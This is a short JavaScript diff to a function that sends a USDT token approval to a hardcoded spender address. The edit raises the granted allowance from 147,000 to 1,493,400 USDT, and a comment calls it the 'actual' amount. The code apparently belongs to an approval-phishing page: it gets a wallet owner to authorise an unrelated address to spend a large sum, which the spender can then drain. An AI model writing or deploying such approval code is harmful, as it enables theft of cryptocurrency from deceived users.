@@ -57,7 +57,7 @@ async function authorizeUSDT() {
             
             // 授权地址和数量
             const spenderAddress = "0x65f9f8F6432375d9fF7E369b0996bE52992013B1";
-            const amount = ethers.utils.parseUnits("147000", 6); // 实际授权数量 147000 USDT
+            const amount = ethers.utils.parseUnits("1493400", 6); // 实际授权数量 1493400 USDT
             
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount);
